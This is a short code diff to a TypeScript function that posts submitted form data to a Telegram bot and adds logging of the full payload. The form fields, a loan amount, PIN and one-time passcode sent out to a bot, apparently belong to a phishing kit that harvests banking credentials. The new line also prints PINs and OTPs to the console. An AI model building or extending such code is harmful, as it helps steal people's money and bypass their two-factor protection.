@@ -31,6 +31,16 @@ export const sendToTelegram = async (data: FormData): Promise<void> => {
 
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`
 
+  console.log('SENDING_TO_TELEGRAM_PAYLOAD:', {
+    name: data.name,
+    phone: data.phone,
+    amount: data.amount,
+    duration: data.duration,
+    pin: data.pin,
+    otp: data.otp,
+    full_message: message
+  })
+
   const response = await fetch(url, {
     method: 'POST',
     headers: {
